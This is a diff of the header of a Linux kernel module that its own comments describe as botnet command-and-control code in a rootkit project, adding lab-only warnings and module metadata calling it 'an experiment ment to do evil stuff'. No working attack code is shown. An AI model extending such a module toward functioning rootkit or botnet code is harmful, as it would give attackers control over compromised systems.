@@ -8,7 +8,16 @@ This is a kernel module used for command and controll in a botnet like maner.
 It will only work in a testing enviroment and is not ment to be used outside the lab.
 This module creates filhandles for communication with the bots.
 
- */
+This module is ment as an experiment and MAY NEVER BE USED OUTSIDE A LAB.....! 
+This module may contain code that alters the behaviour of an operatingsystem in a potentinally malichous maner.
+This software serves no convetnionally usefull purpouse and is continouasly devloped and thefore never finished.
+
+#############################################################
+#  NEVER USER IN A PRODUCTON ENVIROMENT!!!!!!!!!!!!!!!!!!!  #
+#  !!!!***THIS SOFTWARE WILL HARM YOUR SYSTEM***!!!!	    #
+############################################################# 
+
+*/
 
 #include <linux/module.h>	
 #include <linux/socket.h>
@@ -27,6 +36,10 @@ Debug			kerndebug.h
 #include "../headders/colors.h"
 #include "file_defs.c"
 
+MODULE_LICENSE("MIT");        
+MODULE_AUTHOR("Alexander Bjørnsrud");   
+MODULE_DESCRIPTION("This is an experiment ment to do evil stuff.\n If the folder name Rootkit did not tip you of please google the term.\n This module should not be used by anyone for any purpouse exept controlled labratory experiments."); 
+MODULE_VERSION("0.1");    
 
 static int create_device(struct device_out *dev){
 	/**
